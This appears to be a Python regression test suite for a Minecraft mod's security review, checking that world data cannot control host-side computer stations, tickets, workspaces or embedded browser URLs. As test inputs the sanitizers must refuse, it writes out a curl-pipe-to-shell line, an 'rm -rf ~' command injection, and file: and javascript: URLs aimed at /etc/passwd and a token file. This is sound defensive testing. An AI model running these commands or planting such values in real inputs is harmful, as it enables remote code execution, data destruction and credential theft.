#!/usr/bin/env python3
"""Security review 01a (v1.3.0): world data must never reach the host.

Regression tests for the mod-side findings:

  C1  a shared world controlled what a station runs (/.settings opt-out,
      /startup, disk startup, a datapack ROM override, a /cc folder that
      CraftOS's own startup.lua `require`s) and omo.ticket() minted host
      tickets with no owner action; maps auto-created host workspaces from
      their presets; holding any CC:T pocket made it a station.
  H1  CC:T's /computercraft view and its computer GUI bypassed the station rule.
  H2  monitor URLs from NBT/the client were never checked.
  M1  CC:T monitor_touch over modems clicked into stations.
  M3  command blocks and functions could run /omo forget/rename/...
  M5  open-ended CC:T dependency; M6 recipe relied on pack override order.

The pure classes (RomCompare, StationTrust, WebUrls, PresetText) have no
Minecraft dependencies and are compiled and run on their own; the rest are
source/jar wiring checks. Skips the Java part without a JDK.

    python3 tests/test_mod_security.py
"""
import glob
import json
import os
import re
import shutil
import subprocess
import tempfile
import textwrap
import unittest
import zipfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
MOD = REPO / "mod"
JAVA = MOD / "src/main/java/space/omo/life"
RES = MOD / "src/main/resources"
ROM = RES / "data/computercraft/lua/rom"
PURE = [JAVA / "station/RomCompare.java", JAVA / "station/StationTrust.java",
        JAVA / "block/WebUrls.java", JAVA / "station/PresetText.java"]


def jdk_tool(name):
    home = os.environ.get("JAVA_HOME")
    if home and (Path(home) / "bin" / name).is_file():
        return str(Path(home) / "bin" / name)
    return shutil.which(name)


def src(rel):
    return (JAVA / rel).read_text()


def method(text, signature):
    """The body of the first method whose declaration contains `signature`."""
    start = text.index(signature)
    depth, i = 0, text.index("{", start)
    for j in range(i, len(text)):
        depth += {"{": 1, "}": -1}.get(text[j], 0)
        if depth == 0:
            return text[start:j + 1]
    raise AssertionError("unbalanced " + signature)


CHECK = textwrap.dedent(r"""
    import java.nio.file.*;
    import java.util.*;
    import space.omo.life.block.WebUrls;
    import space.omo.life.station.PresetText;
    import space.omo.life.station.RomCompare;
    import space.omo.life.station.StationTrust;

    public class Check {
        static void eq(String what, Object got, Object want) {
            if (!Objects.equals(got, want)) {
                throw new AssertionError(what + ": got " + got + ", want " + want);
            }
        }

        static byte[] b(String s) { return s.getBytes(); }

        public static void main(String[] a) throws Exception {
            // -- RomCompare: the effective ROM must be some installed mod's bytes
            Map<String, List<byte[]>> jars = new HashMap<>();
            jars.put("lua/bios.lua", List.of(b("bios")));
            jars.put("lua/rom/startup.lua", List.of(b("startup")));
            jars.put("lua/rom/autorun/00-omo-station.lua", List.of(b("autorun")));
            jars.put("lua/rom/programs/omo/station.lua", List.of(b("station")));
            Map<String, byte[]> eff = new HashMap<>();
            for (var e : jars.entrySet()) eff.put(e.getKey(), e.getValue().get(0));
            eff.put("lua/treasure/x/y.lua", b("not governed"));
            eq("mods' own ROM", RomCompare.problems(eff, jars::get), List.of());
            Map<String, byte[]> over = new HashMap<>(eff);
            over.put("lua/rom/programs/omo/station.lua", b("evil"));
            eq("overridden station program", RomCompare.problems(over, jars::get),
                List.of("lua/rom/programs/omo/station.lua"));
            Map<String, byte[]> added = new HashMap<>(eff);
            added.put("lua/rom/autorun/000-first.lua", b("evil"));
            eq("added autorun", RomCompare.problems(added, jars::get), List.of("lua/rom/autorun/000-first.lua"));
            Map<String, byte[]> bios = new HashMap<>(eff);
            bios.put("lua/bios.lua", b("evil"));
            eq("overridden bios", RomCompare.problems(bios, jars::get), List.of("lua/bios.lua"));
            Map<String, byte[]> missing = new HashMap<>(eff);
            missing.remove("lua/rom/autorun/00-omo-station.lua");
            eq("omolife pack switched off", RomCompare.problems(missing, jars::get),
                List.of("lua/rom/autorun/00-omo-station.lua (missing)"));
            Map<String, List<byte[]>> two = new HashMap<>(jars);
            two.put("lua/rom/startup.lua", List.of(b("startup"), b("other mod's startup")));
            Map<String, byte[]> otherMod = new HashMap<>(eff);
            otherMod.put("lua/rom/startup.lua", b("other mod's startup"));
            eq("another installed mod's file is fine", RomCompare.problems(otherMod, two::get), List.of());

            // -- StationTrust: tickets only after a live owner use, or a remembered pair with the owner online
            eq("rom problem wins", StationTrust.refusal("rom", true, true, true), "rom");
            eq("live owner use", StationTrust.refusal(null, true, false, false), null);
            eq("world loaded, nobody touched it", StationTrust.refusal(null, false, false, true), StationTrust.WAITING);
            eq("remembered, owner online", StationTrust.refusal(null, false, true, true), null);
            eq("remembered, owner gone", StationTrust.refusal(null, false, true, false), StationTrust.WAITING);
            eq("window open", StationTrust.recent(1000, 1000 + StationTrust.WINDOW_MS - 1), true);
            eq("window closed", StationTrust.recent(1000, 1000 + StationTrust.WINDOW_MS), false);
            eq("never touched", StationTrust.recent(0, 5), false);
            Path f = Files.createTempDirectory("trust").resolve("config/omolife-trusted-stations.txt");
            StationTrust t = new StationTrust(f);
            String st = "0f0e0d0c-0b0a-0908-0706-050403020100";
            eq("empty", t.contains(st, "abc123def456"), false);
            t.add(st, "abc123def456");
            t.add("bad id with spaces", "abc");
            eq("remembered", t.contains(st, "abc123def456"), true);
            eq("pair, not workspace alone", t.contains(UUID.randomUUID().toString(), "abc123def456"), false);
            eq("pair, not station alone", t.contains(st, "000000000000"), false);
            eq("persisted", new StationTrust(f).contains(st, "abc123def456"), true);
            eq("malformed ignored", Files.readString(f).contains("bad"), false);

            // -- WebUrls: http(s) and about:blank only, on load and before the browser
            for (String ok : new String[]{"https://example.com", "http://127.0.0.1:8780/board",
                    "https://www.youtube.com/watch?v=x&t=1#c", "HTTPS://EXAMPLE.COM/A", "about:blank",
                    "http://[::1]:8780/"}) {
                eq("loadable " + ok, WebUrls.loadable(ok), true);
            }
            for (String bad : new String[]{"file:///home/you/.local/share/omo/token", "javascript:alert(1)",
                    "chrome://settings", "data:text/html,x", "about:config", "view-source:https://x",
                    "blob:https://x/1", "ftp://x", "https://user:pw@x.com/", "https://x.com/\nx", "http:\\\\x",
                    "https://", "", " https://x.com", "devtools://devtools/x", "https://x.com/a b"}) {
                eq("refused " + bad, WebUrls.loadable(bad), false);
            }
            eq("bare host", WebUrls.safe("example.com"), "https://example.com");
            eq("loopback", WebUrls.safe("localhost:8780/board"), "http://localhost:8780/board");
            eq("file refused", WebUrls.safe("file:///etc/passwd"), null);
            eq("javascript refused", WebUrls.safe(" JavaScript:alert(1)"), null);
            eq("spaces encoded", WebUrls.safe("https://x.com/search?q=a b"), "https://x.com/search?q=a%20b");
            eq("long refused", WebUrls.safe("https://x.com/" + "a".repeat(2100)), null);

            // -- PresetText: no tmux format characters from world data
            eq("hash stripped", PresetText.name("#(curl -sL a.bc/x|sh)", 24), "(curl -sL a.bc/x|sh)");
            eq("format stripped", PresetText.name("u=#{pid}", 24), "u={pid}");
            eq("control stripped", PresetText.name("a\u0000b\nc\u001b[2J", 24), "abc[2J");
            eq("capped", PresetText.name("x".repeat(50), PresetText.TAB_MAX).length(), 24);
            eq("profile ok", PresetText.profile("web-dev_2.1"), "web-dev_2.1");
            eq("profile with shell chars", PresetText.profile("x;rm -rf ~"), "");
            eq("profile with hash", PresetText.profile("#(id)"), "");
            eq("profile too long", PresetText.profile("p".repeat(65)), "");
            System.out.println("PASS mod security rules");
        }
    }
""")


class PureRulesTest(unittest.TestCase):
    def test_rules(self):
        javac, java = jdk_tool("javac"), jdk_tool("java")
        if not javac or not java:
            self.skipTest("no JDK")
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "classes"
            check = Path(tmp) / "Check.java"
            check.write_text(CHECK)
            subprocess.run([javac, "-d", str(out), *map(str, PURE), str(check)], check=True)
            run = subprocess.run([java, "-cp", str(out), "Check"], capture_output=True, text=True)
            self.assertEqual(run.returncode, 0, run.stderr + run.stdout)
            self.assertIn("PASS", run.stdout)


class StationBootTest(unittest.TestCase):
    """C1 (a)/(b): what a station runs does not depend on the world."""

    def test_autorun_ignores_world_settings_and_startup(self):
        lua = (ROM / "autorun/00-omo-station.lua").read_text()
        code = "\n".join(l for l in lua.split("]]", 1)[1].splitlines() if not l.strip().startswith("--"))
        self.assertNotIn('settings.get("omo.enabled"', code, "a world's /.settings must not stop the station")
        self.assertNotIn("/craftos", code)
        self.assertIn('settings.set("shell.allow_startup", false)', code)
        self.assertIn('settings.set("shell.allow_disk_startup", false)', code)
        self.assertNotIn("settings.save", code, "the overrides stay in memory")
        self.assertIn('loadfile("/rom/programs/omo/station.lua"', code)
        self.assertIn("while true do", code)
        # The overrides come before the loop that keeps the station program running.
        self.assertLess(code.index("shell.allow_startup"), code.index("while true do"))

    def test_cc_folder_guard(self):
        api = src("lua/OmoLuaApi.java")
        start = method(api, "public void startup()")
        self.assertIn('computer.mount("cc", EmptyMount.INSTANCE)', start)
        self.assertIn("bootProblem = BOOT_SHADOWED", start)
        ticket = method(api, "public final MethodResult ticket()")
        self.assertIn("bootProblem", ticket)
        empty = src("lua/EmptyMount.java")
        self.assertIn("implements Mount", empty)
        self.assertNotIn("WritableMount", empty)

    def test_cct_startup_really_requires_from_root(self):
        """Why /cc is guarded: CC:T's startup.lua requires a module before autoruns run."""
        jar = real_cct_jar()
        if not jar:
            self.skipTest("no CC:T jar")
        with zipfile.ZipFile(jar) as z:
            startup = z.read("data/computercraft/lua/rom/startup.lua").decode()
            req = z.read("data/computercraft/lua/rom/modules/main/cc/require.lua").decode()
        self.assertLess(startup.index('require "cc.shell.completion"'), startup.index("/rom/autorun"))
        self.assertIn('package.path = "?;?.lua;?/init.lua;/rom/modules/main/?', req)
        self.assertLess(startup.index("/rom/autorun"), startup.index('settings.get("shell.allow_startup")'))

    def test_rom_check_wired(self):
        rom = src("station/RomCheck.java")
        self.assertIn("SERVER_STARTED", rom)
        self.assertIn("END_DATA_PACK_RELOAD", rom)
        self.assertIn('"computercraft".equals(id.getNamespace())', rom)
        self.assertIn('findPath("data/computercraft/" + path)', rom)
        self.assertIn("RomCheck.problem()", src("station/OwnerPresence.java"))
        self.assertIn("RomCheck.register()", src("OmoLife.java"))
        self.assertIn("OwnerPresence.register()", src("OmoLife.java"))
        for f in RomCompareRequired():
            self.assertTrue((RES / "data/computercraft" / f).is_file() or f in ("lua/bios.lua", "lua/rom/startup.lua"), f)


def RomCompareRequired():
    text = src("station/RomCompare.java")
    block = text[text.index("REQUIRED = List.of("):text.index(");", text.index("REQUIRED = List.of("))]
    return re.findall(r'"([^"]+)"', block)


def real_cct_jar():
    dirs = [os.environ.get("OMO_MODS_DIR", "")]
    home = Path.home()
    for prism in (home / ".local/share/omo/runtime/prism", home / ".local/share/PrismLauncher"):
        dirs += [str(prism / f"instances/{i}/.minecraft/mods") for i in ("OmoTest", "OmoResearch")]
    for d in dirs:
        hits = sorted(glob.glob(os.path.join(d, "cc-tweaked-26.2-fabric-1.120.*.jar"))) if d else []
        if hits:
            return Path(hits[-1])
    return None


class TicketTest(unittest.TestCase):
    """C1 (c)/(d)/(e): no ticket, workspace or pocket station without the owner."""

    def test_ticket_needs_owner(self):
        api = src("lua/OmoLuaApi.java")
        ticket = method(api, "public final MethodResult ticket()")
        self.assertIn("OwnerPresence.ticketRefusal(station)", ticket)
        self.assertLess(ticket.index("ticketRefusal"), ticket.index("BridgeLink.ticket("))
        ensure = method(api, "public final boolean ensure()")
        self.assertIn("OwnerPresence.recent(station)", ensure)
        self.assertLess(ensure.index("OwnerPresence.recent"), ensure.index("ensureWorkspace()"))

    def test_owner_interactions_touch(self):
        for rel, needle in (("block/HermesComputerBlock.java", "OwnerPresence.touch(be, sp)"),
                            ("net/StationPackets.java", "OwnerPresence.touch(station, player)"),
                            ("remote/RemoteWalls.java", "OwnerPresence.touch(station.block(), player)"),
                            ("pocket/Pockets.java", "OwnerPresence.touch(station, sp)"),
                            ("station/CommandGate.java", "OwnerPresence.touch(station, player)")):
            self.assertIn(needle, src(rel), rel)
        touch = method(src("station/OwnerPresence.java"), "public static void touch(")
        self.assertIn("Stations.allowed(player)", touch)
        presence = src("station/OwnerPresence.java")
        self.assertIn('getConfigDir().resolve("omolife-trusted-stations.txt")', presence,
                      "the memory of trusted stations lives on the host, never in the world")

    def test_no_auto_create_from_world(self):
        be = src("block/StationBlockEntity.java")
        tick = method(be, "protected void serverTick()")
        self.assertNotIn("createFor", tick, "a map's preset must not become a host workspace on its own")
        self.assertIn("stale = true", tick)
        ensure = method(be, "public void ensureWorkspace()")
        self.assertIn("isBound() && !stale", ensure)

    def test_preset_text_cleaned(self):
        preset = src("station/StationPreset.java")
        self.assertIn("public StationPreset {", preset)
        self.assertIn("PresetText.name(name, PresetText.NAME_MAX)", preset)
        self.assertIn("PresetText.name(name, PresetText.TAB_MAX)", preset)
        self.assertIn("PresetText.profile(profile)", preset)

    def test_pockets_need_explicit_owner_action(self):
        pockets = src("pocket/Pockets.java")
        build = method(pockets, "public static PocketBrain build(")
        self.assertNotIn("Stations.allowed", build, "holding a pocket must not convert it")
        self.assertIn("CONVERTING.get() == null", build)
        use = method(pockets, "public static InteractionResult use(")
        self.assertIn("convert(item, holder, stack)", use)
        self.assertLess(use.index("Stations.allowed(sp)"), use.index("convert(item, holder, stack)"))

    def test_station_lua_waits_for_owner_and_adjacent_monitors(self):
        lua = (ROM / "programs/omo/station.lua").read_text()
        self.assertIn('wsOrWhy == "waiting for owner"', lua)
        self.assertIn('e == "omo_owner"', lua)
        self.assertIn("owner        = {", lua)
        self.assertNotIn('peripheral.find("monitor")', lua, "M1: never adopt a monitor over a modem")
        self.assertIn('peripheral.hasType(side, "monitor")', lua)
        self.assertIn('local creating = omo.ensure()', lua)


class CcCommandAndGuiTest(unittest.TestCase):
    """H1, M1, M3: CC:T's own paths and /omo hold the station rule."""

    def test_mixins_registered(self):
        mixins = json.loads((RES / "omolife.mixins.json").read_text())
        for m in ("ComputerCraftCommandMixin", "ComputerInputGuardMixin", "ComputerMenuGuardMixin",
                  "CommandSourceAccessor", "AgentPermissionsMixin", "MonitorInteractMixin"):
            self.assertIn(m, mixins["mixins"], m)
            self.assertTrue((JAVA / f"mixin/{m}.java").is_file(), m)

    def test_computercraft_command_gated(self):
        cmd = src("mixin/ComputerCraftCommandMixin.java")
        for name in ("view", "shutdown", "turnOn", "teleport"):
            self.assertIn(f'method = "{name}"', cmd, name)
        self.assertEqual(cmd.count("CommandGate.refuseStations("), 4)
        gui = src("mixin/ComputerInputGuardMixin.java")
        self.assertIn("CommandGate.mayUseComputer(player, menu.getComputer())", gui)
        self.assertIn("ci.cancel()", gui)
        menu = src("mixin/ComputerMenuGuardMixin.java")
        self.assertIn('method = "stillValid"', menu)
        self.assertIn("Stations.allowed(sp)", menu)
        self.assertIn("StationComputers.mark(computer, this)", src("block/StationBlockEntity.java"))
        self.assertIn("StationComputers.mark(built, this)", src("pocket/PocketStation.java"))

    def test_command_gate(self):
        gate = method(src("station/CommandGate.java"), "public static boolean trusted(")
        self.assertIn("src.getEntity() == player && Stations.allowed(player)", gate,
                      "execute-as from a function or command block is not the player")
        self.assertIn("Permissions.COMMANDS_OWNER", gate, "functions run with gamemaster, the console with owner")
        self.assertNotIn("isPlayer()", gate)
        for rel in ("station/StationCommands.java", "builder/BuilderCommands.java"):
            allowed = method(src(rel), "private static boolean allowed(")
            self.assertIn("CommandGate.trusted(src)", allowed, rel)
            self.assertNotIn("return true", allowed, rel)

    def test_agent_lan_commands_off(self):
        lan = src("client/AgentLan.java")
        self.assertIn("server.getDefaultGameType(), false, candidate)", lan)
        self.assertNotRegex(lan, r"getDefaultGameType\(\), commands,")
        perms = src("mixin/AgentPermissionsMixin.java")
        self.assertIn("AgentLanFlags.agentCommands", perms)
        self.assertIn("AgentLanFlags.isAgent(who.name())", perms)
        self.assertIn("LevelBasedPermissionSet.GAMEMASTER", perms)
        self.assertNotIn("getOps()", perms, "agents never land on the ops list (that would pass Stations.allowed)")

    def test_monitor_touch_gated(self):
        mixin = src("mixin/MonitorInteractMixin.java")
        self.assertIn("StationComputers.byComputerId(c.getID())", mixin)
        self.assertIn("!Stations.allowed(sp)", mixin)
        walls = method(src("remote/RemoteWalls.java"), "private static Station target(")
        self.assertIn("Stations.allowed(player)", walls, "L4: deopped players lose the wall")


class WebWallTest(unittest.TestCase):
    """H2 (and L5): untrusted page addresses never reach Chromium."""

    def test_url_checked_on_load_and_client(self):
        be = src("block/OmoMonitorBlockEntity.java")
        load = method(be, "public void loadAdditional(")
        self.assertIn("loadedUrl(", load)
        self.assertIn("WebUrls.loadable(raw)", method(be, "private String loadedUrl("))
        self.assertIn("WebUrls.loadable(u)", method(be, "public void setWeb("))
        self.assertIn("return WebUrls.safe(raw);", method(be, "public static String safeUrl("))
        pages = src("client/WebPages.java")
        open_ = method(pages, "public static Page open(")
        self.assertLess(open_.index("WebUrls.loadable(url)"), open_.index("PAGES.get(origin)"))
        self.assertIn("mayAutoLoad(origin)", open_)
        self.assertIn("hasSingleplayerServer()", method(pages, "private static boolean mayAutoLoad("))
        self.assertIn("WebUrls.loadable(target)", method(pages, "void navigate("))
        client = src("client/OmoLifeClient.java")
        self.assertIn("WebPages.allowWall(be.origin())", client)
        self.assertIn("WebPages.forgetAllowedWalls()", client)

    def test_new_tab_rate_limited(self):
        hooks = src("client/CefHooks.java")
        self.assertIn("newTabAllowed(browser)", hooks)


class PackagingTest(unittest.TestCase):
    """M5, M6, and the built jar."""

    def test_cct_dependency_pinned(self):
        meta = json.loads((RES / "fabric.mod.json").read_text())
        self.assertEqual(meta["depends"]["computercraft"], ">=1.120.2 <1.121")

    def test_station_recipe_needs_no_cct(self):
        recipe = json.loads((RES / "data/omolife/recipe/hermes_computer.json").read_text())
        self.assertEqual(recipe["result"]["id"], "omolife:hermes_computer")
        self.assertNotIn("computercraft", json.dumps(recipe), "craftable whatever the pack order")
        adv = (RES / "data/omolife/advancement/recipes/redstone/hermes_computer.json").read_text()
        self.assertNotIn("computercraft", adv)

    def test_built_jar(self):
        jars = sorted((MOD / "build").glob("omolife-*.jar"))
        if not jars:
            self.skipTest("no built jar (run mod/build.sh)")
        jar = jars[-1]
        if jar.stat().st_mtime < max(p.stat().st_mtime for p in (JAVA / "station").glob("*.java")):
            self.skipTest("built jar is older than the sources")
        with zipfile.ZipFile(jar) as z:
            names = set(z.namelist())
            for cls in ("station/RomCheck", "station/OwnerPresence", "station/CommandGate", "lua/EmptyMount",
                        "mixin/ComputerCraftCommandMixin", "mixin/ComputerInputGuardMixin", "block/WebUrls"):
                self.assertIn(f"space/omo/life/{cls}.class", names, cls)
            autorun = z.read("data/computercraft/lua/rom/autorun/00-omo-station.lua").decode()
            self.assertIn('settings.set("shell.allow_startup", false)', autorun)
            self.assertFalse(any(n.endswith(".orig") or n.endswith(".rej") for n in names))


if __name__ == "__main__":
    unittest.main()
